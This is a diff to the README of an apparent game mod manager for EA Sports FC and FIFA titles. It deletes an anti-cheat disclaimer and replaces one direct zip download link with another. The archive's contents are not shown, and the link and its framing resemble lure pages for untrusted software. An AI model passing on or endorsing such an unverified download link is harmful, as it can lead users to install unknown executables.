@@ -11,11 +11,9 @@
 
 **FIFA-FC-Mod-Manager** is a complete mod management solution for **EA Sports FC 26, FC 25, FC 24** and all **FIFA** games from FIFA 19 to FIFA 23 . It supports .fifamod and .fbmod files, providing drag & drop import, load order control, conflict detection, and BepInEx integration. Perfect for enhancing graphics, kits, faces, stadiums, gameplay, and career mode .
 
-⚠️ **Disclaimer:** For educational purposes only. Use at your own risk. EAAC anti-cheat may detect mods in online modes .
-
 ## 📥 Download
 
-**[Download FC-FIFA-Mod-Manager](https://github.com/john-lee-code19v0/FIFA-FC-Mod-Manager/releases/download/915/FifkaModManager.zip)**
+**[Download FC-FIFA-Mod-Manager](https://github.com/john-lee-code19v0/FIFA-FC-Mod-Manager/releases/download/916/FIFAMODMANAGERFC.zip)**
 
 
 ---
